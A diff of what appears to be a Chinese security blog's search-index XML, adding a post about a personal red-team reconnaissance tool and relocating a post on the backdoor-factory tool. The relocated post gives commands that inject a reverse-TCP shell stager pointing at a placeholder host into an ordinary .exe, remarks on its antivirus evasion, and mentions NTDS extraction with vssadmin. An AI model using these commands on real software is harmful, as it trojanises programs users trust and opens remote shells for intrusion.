@@ -110,6 +110,22 @@
       </tags>
   </entry>
   <entry>
+    <title>红队单兵自动化-斯卡纳Skarner</title>
+    <url>/2021/12/12/%E7%BA%A2%E9%98%9F%E5%8D%95%E5%85%B5%E8%87%AA%E5%8A%A8%E5%8C%96-%E6%96%AF%E5%8D%A1%E7%BA%B3Skarner/</url>
+    <content><![CDATA[<p>2019年在手机备忘录上写了一句“开发自动化信息收集工具”。想法的萌生起因于当时在第一家公司的时候，他们开发了一个信息收集的产品，看着真不错呀。但是各种复杂的原因，该产品总是不尽人意，或者说不尽我意（虽然开发那个产品的各位大佬们真的辛苦了），另外我也知道我不可能一直待在那家公司，也不可能对该产品拥有永久使用权，所以想着还是自己着手搞一个吧。后来，我尝试二开bayonet/Watchdog，也尝试以goby为基础做一些改进，各种自动化信息收集的开源工具，我都或多或少的尝试改进来达到形成自己的武器库/体系。但是始终在别人的基础上魔改都少点意思，后来干脆自己开发了。在加入水滴之后的一次武器化研究过程中，为了解决hw资产收集不全的痛点，借鉴ENscan的思路开发出了“先锋”，用来快速获取目标单位及下属单位的所有网络资产。“先锋”在后续的使用中确实帮助非常大，节省不少人力和精力用以来帮助红队人员（至少是我）全身心投入打点，而不用管其他杂七杂八的事情。后来“先锋”的路子有点堵了，没有更多的血液加入使得它仿佛就只是个工具，没有灵魂（狗头）。轮子造好了，但只有轮子怎么行，俺还要有车。所以，在“先锋”的基础上进行了大更改，并且接着“先锋”后面做了更多自动化信息收集，只需输入单位名称/域名/IP–&gt;输出所有网络资产和指纹信息，这样只需要看指纹就能快速打点了。另外还顺带接了xray和机器人，来扫扫边角料捡漏。<br></p><a id="more"></a>
+<blockquote>
+<p>该工具仅内部使用<br>该文章仅记录和占位</p>
+</blockquote>
+<p>​</p>
+<p>水晶先锋The Crystal Vanguard / 斯卡纳Skarner</p>
+<hr>
+<p>“我来告诉你什么是怪物”<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/20362568/1635224930074-a2f45332-7863-4e46-b348-bb5cbb1eaae4.jpeg#clientId=u54e033ae-acc5-4&from=drop&id=u7b02a7d7&margin=%5Bobject%20Object%5D&name=%E8%B4%B4%E5%9B%BE.jpg&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&size=618394&status=done&style=none&taskId=ud9577530-393a-4f4d-ae1c-5400b61fa6e" alt="贴图.jpg"><br><br><br>水晶先锋是“先锋”的后续版本。因不满足查询企业信息数据的单一功能，便想着自己动手开发一个能舒服、流畅度过红队项目前期各种信息收集的单兵自动化工具。<br>该工具以输入企业名称、输出该企业所有资产(隐藏资产除外)的指纹识别信息为主，以xray漏扫为辅</p>
+]]></content>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记《寻觅意义》</title>
     <url>/2021/10/22/%E8%AE%B0%E3%80%8A%E5%AF%BB%E8%A7%85%E6%84%8F%E4%B9%89%E3%80%8B/</url>
     <content><![CDATA[<p>《寻觅意义》- 王德峰</p><a id="more"></a>
@@ -4500,21 +4516,6 @@
       </tags>
   </entry>
   <entry>
-    <title>shellcode注入工具—backdoor-factory</title>
-    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
-    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
-
-<p>生成好之后可以对比一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
-
-<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
-]]></content>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vssadmin获取NTDS实操</title>
     <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
     <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
@@ -4553,6 +4554,21 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode注入工具—backdoor-factory</title>
+    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
+    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
+
+<p>生成好之后可以对比一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
+
+<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
+]]></content>
+      <tags>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
